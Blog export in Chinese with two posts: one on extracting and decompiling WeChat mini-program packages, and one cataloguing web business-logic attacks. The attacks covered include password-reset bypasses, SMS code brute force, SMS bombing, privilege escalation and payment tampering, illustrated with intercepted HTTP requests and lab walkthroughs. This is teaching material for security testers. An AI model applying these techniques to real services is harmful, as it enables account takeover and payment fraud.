<p>​    <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhjtyk6hsj30gu01kdg6.jpg" alt="image-20200605173823025"></p>
<p>2、反编译脚本，github搜索wxappUnpacker或其他版本(由于敏感此处不放连接，自行下载)</p>
<p>3、模拟器(手机)，夜神、雷神、逍遥等都可以。</p>
<h3 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h3><p>1、下载RE文件管理器，允许使用超级管理员权限</p>
<p>2、手机已ROOT或使用模拟器ROOT模式</p>
<p>3、下载微信</p>
<h3 id="0x02-获取小程序包"><a href="#0x02-获取小程序包" class="headerlink" title="0x02 获取小程序包"></a>0x02 获取小程序包</h3><p>当点开一个微信小程序，如果本地这个文件夹下找到即将运行的小程序，会从微信服务器下载到本地，在以后的某个时刻又运行这个小程序，运行时，微信服务器会通知有没有小程序新版本，如有新版本，会在后台静默下载，小程序继续运行，新版本要到下一次运行才会启用，这就是微信小程序的更新机制。</p>
<p>小程序包地址：/data/data/com.tencent.mm/MicroMsg/随机长字符串/appbrand/pkg/</p>
<p>将pkg文件夹中的包清空，返回微信打开需要抓取的小程序包</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhk98ak0fj30r20f076n.jpg" alt="image-20200605175303195"></p>
<p>点击小程序后，返回pkg目录可以看见有两个新的包(如果没有重新进一下这个目录)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhkbr62d1j30r20fu76n.jpg" alt="image-20200605175529451"></p>
<p>将两个包打包成zip或rar文件，使用QQ发送给好友或者电脑助手，到此获取微信小程序包已经完成。</p>
<h3 id="0x03-反编译"><a href="#0x03-反编译" class="headerlink" title="0x03 反编译"></a>0x03 反编译</h3><p>将小程序包放到反编译文件目录中，切换到目录后安装依赖包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line"></span><br><span class="line">npm install css-tree</span><br><span class="line"></span><br><span class="line">npm install cssbeautify</span><br><span class="line"></span><br><span class="line">npm install vm2</span><br><span class="line"></span><br><span class="line">npm install uglify-es</span><br><span class="line"></span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure>

<p>全部安装成功后，反编译小程序包</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhktnie35j30yo0isah1.jpg" alt="image-20200605181240857"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：node wuWxapkg.js _-2013801684_4.wxapkg</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhkvas6nnj31gm0u0qoh.jpg" alt="image-20200605181415278"></p>
<p>反编译成功，在目录下有一个小程序的包同名目录</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhkx1ltvmj30zq0badk9.jpg" alt="image-20200605181557042"></p>
<p>目录中就是小程序的代码，使用微信开发工具打开。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhl0ibzl8j31uc0u01c4.jpg" alt="image-20200605181915816"></p>
]]></content>
      <categories>
        <category>小程序</category>
      </categories>
      <tags>
        <tag>反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>业务安全测试方法总结</title>
    <url>/2020/07/30/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gh8rn8qz3rj31c00u07wh.jpg" alt="65"></p>
<a id="more"></a>

<h3 id="0x01-登录认证"><a href="#0x01-登录认证" class="headerlink" title="0x01 登录认证"></a>0x01 登录认证</h3><h4 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h4><p>在验证用户身份的时候，或判断用户是否已注册时，若验证码处理不当、或错误提醒明确，都可能存在用户枚举。</p>
<p>案例：</p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114105735423-827277158.png" alt="img"></p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114105740533-1181359063.png" alt="img"></p>
<h4 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h4><h5 id="短信验证码回传"><a href="#短信验证码回传" class="headerlink" title="短信验证码回传"></a>短信验证码回传</h5><p>通过手机找回密码，发送验证码的响应包中包含了短信验证码。</p>
<p>案例：</p>
<p>​    <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gha5hd6dd4j30ht0aedhc.jpg" alt="image-20200731144333975"></p>
<p>​    当点击发送按钮后，拦截返回包，短信验证码包含在返回包中，导致可重置账户密码。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gha5iwg45fj30nf06r412.jpg" alt="image-20200731144504700"></p>
<h5 id="用户凭证修改任意账户密码"><a href="#用户凭证修改任意账户密码" class="headerlink" title="用户凭证修改任意账户密码"></a>用户凭证修改任意账户密码</h5><p>通过手机找回密码是一般需要短信验证码验证（这里可以尝试爆破或绕过），当我们输入正确的手机号和正确的短信验证码，然后进入重置密码的最后一步，也就是输入新的密码，输入密码后提交到服务端的post数据包需要包含当前用户的身份信息，而一般网站是通过用户名或用户ID来标识用户身份的，如果这个用户名或用户ID没有和当前手机号、短信验证码进行绑定，也就是说服务端只验证用户名、ID是否存在，而不去验证用户和当前手机号是否匹配，那么我们就可以通过修改用户名、ID去修改其他用户的密码了。当然可以修改的地方不限于找回密码的数据包，比如修改资料的地方也可能存在这样的漏洞。</p>
<p>案例：</p>
<p>​    以某网站修改任意用户资料导致修改任意账号密码为例，截取的数据包为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;info_do HTTP&#x2F;1.1</span><br><span class="line">Host: www.XXX.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko&#x2F;20100101 Firefox&#x2F;59.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;www.XXX.com&#x2F;user&#x2F;info_view</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 211</span><br><span class="line">Cookie: yunsuo_session_verify&#x3D;9341a54b945886e9485ff54a17650468; PHPSESSID&#x3D;sgbibaqe7f8f6okerps8jip916; sdrcUserlockcount&#x3D;1; sdrcUseruserid&#x3D;14943</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">password&#x3D;A123456&amp;email&#x3D;1%40qq.com&amp;address&#x3D;1&amp;postcode&#x3D;1&amp;mobile&#x3D;13888888888&amp;sex&#x3D;man&amp;birthday&#x3D;0000-00-00&amp;degree&#x3D;collegeLT&amp;testsite&#x3D;1&amp;post&#x3D;1&amp;__hash__&#x3D;b0b15b067dea00bd34fd39421b7ef684_efc2399e5c4b2071f261e75fe3362d4fa</span><br></pre></td></tr></table></figure>

<p>经分析与尝试，发现数据包中的sdrcUseruserid的值是用来标识当前用户身份的，那么我们就想到这个id可否任意修改呢？答案是肯定的，我们修改id的值为14942、14941都是可以成功的，截图如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghaaw9gizaj30ni04xtaw.jpg" alt="image-20200731175054967"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghaawjp8zpj30nm060ac2.jpg" alt="image-20200731175111770"></p>
<h5 id="修改响应包重置任意账户密码"><a href="#修改响应包重置任意账户密码" class="headerlink" title="修改响应包重置任意账户密码"></a>修改响应包重置任意账户密码</h5><p>通过手机找回密码一般需要短信验证码验证，服务端需要告诉客户端，输入的验证码是否正确，如果客户端收到true的信息，那么就会向带着true的信息向服务端请求进入下一步，而服务端收到true的信息，就会允许客户端进入下一步，反之，如果是false的信息，服务端就不会允许客户端进入下一步。也就是说我们进入下一步的关键是让服务端收到客户端的true信息，而借助burpsuite，我们可以修改服务端返回到客户端的信息，这样一来，我们就可以输入任意短信验证码，然后将服务端返回的false信息改为true就可以绕过短信验证码的验证了。</p>
<p>案例：下面是找回密码的一个流程，输入正确的用户名，跳到第二步，这时需要输入短信验证码，这里我们随意输入一个短信验证码：123456，然后抓取服务端返回的信息如下所示。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghab9n7dsoj30nm07btar.jpg" alt="image-20200731180346830"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghab9u622uj30nf06vwfj.jpg" alt="image-20200731180358376"></p>
<p>把回包中false改为true后，即可绕过短信验证码验证，结果如下图所示。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghaba5v51bj30d0073mxk.jpg" alt="image-20200731180416615"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghabab2m5rj30e0077t8y.jpg" alt="image-20200731180425178"></p>
<p>乌云案例：<a href="https://m.hundan.org/2015-0137432" target="_blank" rel="noopener">https://m.hundan.org/2015-0137432</a></p>
<h5 id="跳过验证步骤重置任意账户密码"><a href="#跳过验证步骤重置任意账户密码" class="headerlink" title="跳过验证步骤重置任意账户密码"></a>跳过验证步骤重置任意账户密码</h5><p>找回密码流程一般需要四个步骤：1、验证用户名；2、验证短信验证码；3、输入新密码；4、重置成功。这四个步骤应该紧紧相连，互相相关，只有通过了第一个步骤验证才可以进入下一个步骤，如果每个步骤之间没有进行关联性验证，就可能导致跳过关键验证步骤，从而导致重置任意账号密码。</p>
<p>案例：某网站找回密码有四个步骤，第一步输入正确的用户名，第二步输入手机号和正确的验证码，截取服务端返回的数据包为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>object moved<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>object moved to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/Personal/sys/getpasswordreset"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述数据包是用来跳转到输入密码的界面，我们猜想能否输入任意验证码，然后直接访问输入密码界面，结果是可以的，而且重置密码成功了。经分析，此处成功的关键是页面跳转到输入密码界面，当我们输入新的密码后，提交到服务端，服务端并没有对当前用户身份进行二次验证，只是简单的获取到用户名或ID以及新密码，从而导致跳过短信验证码验证重置任意账号密码。</p>
<h5 id="重置密码链接中token值未验证或不失效导致任意账号密码重置"><a href="#重置密码链接中token值未验证或不失效导致任意账号密码重置" class="headerlink" title="重置密码链接中token值未验证或不失效导致任意账号密码重置"></a>重置密码链接中token值未验证或不失效导致任意账号密码重置</h5><p>使用邮箱重置密码时，服务端向邮箱发送一个重置密码的链接，链接中包含当前用户的身份信息（如用户名或用户ID）和一个随机生成的token信息，如果未对token值进行验证或是验证后不失效，我们就可以通过修改用户名或用户ID来重置任意账号密码。</p>
<p>案例：某网站使用邮箱找回密码时，服务端向邮箱发送的链接为：</p>
<p><a href="http://www.xxx.com/GetPwd.aspx?q=0x0531387a5a6c1227e4d6ba0ce16dc72e&amp;r=3244166" target="_blank" rel="noopener">http://www.xxx.com/GetPwd.aspx?q=0x0531387a5a6c1227e4d6ba0ce16dc72e&amp;r=3244166</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghabzno2e5j30ne068mze.jpg" alt="image-20200731182847148"></p>
<p>经尝试，此处未对随机生成的q值进行验证或是验证了但是验证之后未失效，导致可以重复使用，最终只需要修改r为其他用户ID，即可重置其他用户密码。</p>
<h5 id="找回密码的短信验证码可被爆破导致任意账号密码重置"><a href="#找回密码的短信验证码可被爆破导致任意账号密码重置" class="headerlink" title="找回密码的短信验证码可被爆破导致任意账号密码重置"></a>找回密码的短信验证码可被爆破导致任意账号密码重置</h5><p>找回密码时使用位数较少的短信验证码，或者验证码没有设置有效时间限制，导致攻击者借助自动化工具在一定时间范围内爆破获得短信验证码，从而导致重置任意账号密码。</p>
<p>案例：某网站找回密码时使用短信验证码的一个数据包为：</p>
<p>Code=5000&amp;u=13888888888&amp;Check=dc5b94101cb4f23a9ce6ae71197fc5de&amp;a=5</p>
<p>此处可以对Code进行爆破，如下图所示：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghac78lfmnj30n90dqwkk.jpg" alt="image-20200731183604450"></p>
<h5 id="服务端未对身份做校验"><a href="#服务端未对身份做校验" class="headerlink" title="服务端未对身份做校验"></a>服务端未对身份做校验</h5><p>验证身份时，未对答案进行校验，输入任意答案即可进入下一步</p>
<p>案例：忘记密码处，第二步中，选择其他方式找回，通过密保找回，未对密保答案进行验证，随便输入答案，即可跳转到设置密码处</p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104847607-366369269.png" alt="img"></p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104852953-2013938345.png" alt="img"></p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104858086-781806113.png" alt="img"></p>
<h4 id="验证码置空绕过验证"><a href="#验证码置空绕过验证" class="headerlink" title="验证码置空绕过验证"></a>验证码置空绕过验证</h4><p>短信验证码处，随便输入其他，验证码错误，而置空却不校验，则可以通过置空绕过</p>
<p>案例：我的==&gt;登陆==&gt;短信验证码登陆登陆时抓包把code（验证码字段）值置为空，即可登陆任意账户</p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104947130-55951450.png" alt="img"></p>
<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104952216-1783664771.png" alt="img"></p>
<h4 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h4><p>对发送短信验证码时间未做限制，导致可无限重发短信导致短信轰炸</p>
<p>案例：<img src="https://wooyun.x10sec.org/static/bugs/full/586a57ad6de8f853ac441df6476aac4342419982.jpg" alt="1.png"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://wooyun.x10sec.org/static/bugs/full/58185e56f475cfd9690a2c82ae1133b5314d5c72.jpg" alt="短信.png"></h4><h4 id="邮箱轰炸"><a href="#邮箱轰炸" class="headerlink" title="邮箱轰炸"></a>邮箱轰炸</h4><p>同短信轰炸原理一样，未对验证发送机制时间进行限制，可无限重发</p>
<p>案例：</p>
<p><img src="https://img2018.cnblogs.com/common/1474830/201912/1474830-20191214111156985-526687803.png" alt="img"></p>
<h3 id="0x02-业务风控"><a href="#0x02-业务风控" class="headerlink" title="0x02 业务风控"></a>0x02 业务风控</h3><h4 id="刷优惠券"><a href="#刷优惠券" class="headerlink" title="刷优惠券"></a>刷优惠券</h4><p>程序逻辑设计错误，优惠券参数可控，攻击者修改参数导致重复获取优惠券或重新生成大数额优惠券</p>
<p>乌云案例：</p>
<p>​    <a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0109007.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0109007.html</a></p>
<p>​    <a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0168071.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0168071.html</a></p>
<h4 id="恶意套现"><a href="#恶意套现" class="headerlink" title="恶意套现"></a>恶意套现</h4><p>网站验证机制或人工验证机制不完善，导致可恶意套现</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-099622.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-099622.html</a></p>
<h3 id="0x04-会话访问"><a href="#0x04-会话访问" class="headerlink" title="0x04 会话访问"></a>0x04 会话访问</h3><h4 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h4><p>尝试登录多个账户，sessionid不变，可通过遍历用户名，登录已存在用户</p>
<p>乌云案例: <a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-025427.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2013-025427.html</a></p>
<h4 id="COOKIE仿冒"><a href="#COOKIE仿冒" class="headerlink" title="COOKIE仿冒"></a>COOKIE仿冒</h4><p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在 Cookie中， 并发送至客户端存储。攻击者通过尝试修改Cookie中的身份标识，从而达到仿冒其他用户 身份的目的，并拥有相关用户的所有权限。</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-051424.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2014-051424.html</a></p>
<h3 id="0x05-授权访问"><a href="#0x05-授权访问" class="headerlink" title="0x05 授权访问"></a>0x05 授权访问</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>用户没有通过认证授权的情况下可直接访问需要通过认证才能访问到的页面或文本信息。 </p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0203819.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0203819.html</a></p>
<h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权</p>
<p><img src="https://img-blog.csdnimg.cn/20191112160308362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>登录普通用户pikachu 密码000000 只有查看权限</p>
<p><img src="https://img-blog.csdnimg.cn/20191112160419314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>登录超级用户 admin 密码为123456 拥有修改用户信息和添加用户的权限</p>
<p><img src="https://img-blog.csdnimg.cn/20191112160610637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>用admin用户添加一个新用户 并用burp进行抓包 可以看到PHPSESSID</p>
<p><img src="https://img-blog.csdnimg.cn/20191112161050197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>打开另一个浏览器 登录普通用户pikachu后尝试直接复制admin用户的添加用户网址来进行添加用户 （未授权访问）</p>
<p><img src="https://img-blog.csdnimg.cn/20191112161408110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p> 发现会回到登录界面</p>
<p><img src="https://img-blog.csdnimg.cn/2019111216145140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>但是用admin用户查看的时候 test2用户已经被添加成功(admin用户需要在登陆状态)</p>
<p><img src="https://img-blog.csdnimg.cn/20191112161600355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p> 用burp实现 重新用管理员账号添加用户 用burp进行抓包</p>
<p><img src="https://img-blog.csdnimg.cn/20191112162310957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p> 将抓到的请求发送到repeater中</p>
<p><img src="https://img-blog.csdnimg.cn/20191112162808103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>登陆普通用户 抓取普通用户的cookie值</p>
<p><img src="https://img-blog.csdnimg.cn/20191112162912200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p> 普通用户登陆成功后 将这个cookie值修改到发送到repeater中的请求中 重放这个数据包</p>
<p><img src="https://img-blog.csdnimg.cn/20191112164935726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p> 刷新页面查看 发现有了两个test3 一个为admin添加的 一个是重放admin的数据包添加的</p>
<p><img src="https://img-blog.csdnimg.cn/20191112165117155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0189507.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0189507.html</a></p>
<h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><p> A用户和B用户属于同一级别用户，但各自不能操作对方个人信息。A用户如果越权操作B用户个人信息的情况称为水行越权操作</p>
<p>案例：</p>
<p>三个用户 lucy/lili/kobe 密码都为123456</p>
<p><img src="https://img-blog.csdnimg.cn/2019111211510614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>随便登录其中一个用户lucy 可以看到地址栏里  “url为op1_mem.php?username=lucy&amp;submit=点击查看个人信息</p>
<p><img src="https://img-blog.csdnimg.cn/20191112115304599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>退出lucy登录其他用户 可以看到地址只有username不同</p>
<p><img src="https://img-blog.csdnimg.cn/20191112115522877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>不退出lili账号 直接在地址栏中将username改成lucy 也可以直接访问lucy的信息</p>
<p><img src="https://img-blog.csdnimg.cn/20191112115712811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196371.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196371.html</a></p>
<h3 id="0x06-支付逻辑"><a href="#0x06-支付逻辑" class="headerlink" title="0x06 支付逻辑"></a>0x06 支付逻辑</h3><h4 id="用户ID篡改"><a href="#用户ID篡改" class="headerlink" title="用户ID篡改"></a>用户ID篡改</h4><p>遍历用户ID，是否可查看其他用户信息</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0111617.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0111617.html</a></p>
<h4 id="修改支付价格"><a href="#修改支付价格" class="headerlink" title="修改支付价格"></a>修改支付价格</h4><p>抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0117083.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0117083.html</a></p>
<h4 id="修改支付状态"><a href="#修改支付状态" class="headerlink" title="修改支付状态"></a>修改支付状态</h4><p>没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功。</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0102292.html</a></p>
<h4 id="修改商品数量"><a href="#修改商品数量" class="headerlink" title="修改商品数量"></a>修改商品数量</h4><p>抓包修改商品数量等字段，将请求中的商品数量修改成任意数额，查看能否以修改后的数量完成</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0120863.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0120863.html</a></p>
<h4 id="越权支付"><a href="#越权支付" class="headerlink" title="越权支付"></a>越权支付</h4><p>生成订单，修改用户ID，实现跨用户付款</p>
<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0174748.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0174748.html</a></p>
<h4 id="多线程并发引起的支付漏洞"><a href="#多线程并发引起的支付漏洞" class="headerlink" title="多线程并发引起的支付漏洞"></a>多线程并发引起的支付漏洞</h4><p>例：<br>某游戏平台存在首充礼包，一个账户只能开通一次首充，这时会产生2重不同思路漏洞。<br>1.选择1元首充—-选择支付宝扫码支付—-弹出支付宝的付款码<br>这时，不要扫码付款，用此方法重放获取多个1元首充礼包支付宝支付界面。如果逻辑校验出错时，创建新订单时上一订单不会失效，依次同时付款，就会发现首充礼包不断到账。从而产生支付漏洞。<br>2.还有一种思路就是，某游戏平台的首充礼包里有1元6元两个挡位供用户选择，此时同时创建1元礼包和6元礼包2个付款码同时支付，如存在逻辑问题，两份礼包都会到账。</p>
<h3 id="0x07-靶场实战"><a href="#0x07-靶场实战" class="headerlink" title="0x07 靶场实战"></a>0x07 靶场实战</h3><p>webug4.0 <a href="https://zhuanlan.zhihu.com/p/98035469" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98035469</a></p>
<p>pikachu <a href="https://zhuanlan.zhihu.com/p/101116258" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/101116258</a></p>
<p>文章：<a href="https://www.cnblogs.com/ping007/p/10265764.html" target="_blank" rel="noopener">https://www.cnblogs.com/ping007/p/10265764.html</a></p>
<p><a href="https://bloodzer0.github.io/vulnerability/logical-vulnerability/account/" target="_blank" rel="noopener">https://bloodzer0.github.io/vulnerability/logical-vulnerability/account/</a></p>
<p><a href="https://wooyun.x10sec.org/search?keywords=验证码&content_search_by=by_bugs" target="_blank" rel="noopener">https://wooyun.x10sec.org/search?keywords=%E9%AA%8C%E8%AF%81%E7%A0%81&amp;content_search_by=by_bugs</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0107127.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0107127.html</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0183875.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0183875.html</a></p>
<p><a href="http://w.hundan.org/search.php?content=短信验证码回传&start=1" target="_blank" rel="noopener">http://w.hundan.org/search.php?content=%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E4%BC%A0&amp;start=1</a>.</p>
<p><a href="https://websec.readthedocs.io/zh/latest/vuln/logic.html" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/vuln/logic.html</a></p>
<p><strong><a href="https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw</a></strong></p>
